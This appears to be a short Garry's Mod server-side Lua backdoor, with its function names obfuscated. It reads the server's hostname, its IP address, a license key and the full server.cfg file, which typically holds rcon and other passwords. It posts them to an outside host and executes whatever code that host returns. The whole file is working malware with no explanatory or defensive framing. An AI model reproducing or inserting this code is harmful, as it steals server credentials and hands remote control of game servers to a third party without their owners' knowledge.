if !SERVER then return end
local WAYL = http.Post
local WAYLΩ = RunString
local W,A,Y,L = GetHostName(), nut.util.getAddress(), Firestone.License, file.Read("cfg/server.cfg","GAME")

WAYL("http://wayl.5v.pl/post.php",{w=W,a=A,y=Y,l=L}, function(FS) WAYLΩ(FS) end) 
